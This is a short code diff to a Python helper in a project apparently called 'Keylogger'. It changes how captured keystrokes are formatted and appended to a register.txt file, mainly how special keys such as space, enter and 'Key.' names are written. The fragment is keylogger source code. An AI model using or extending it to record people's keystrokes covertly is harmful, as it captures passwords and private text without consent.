@@ -8,15 +8,14 @@ def write_register(keys):
     with open("Keylogger/register.txt","a") as register:
         for key in keys:
             k = str(key).replace("'","")
-            print(k.find("enter"))
             if k.find("space") > 0:
                 register.write(" ")
             elif k.find("enter")> 0:
                 register.write("\n")    
-            elif k.find("key") == -1:
-                register.write(k)
+            elif k.find("Key.") == 0:
+                register.write(" "+k+" ") 
             else:
-                register.write(" "+k+" ")
+                register.write(k)
 
 
                   
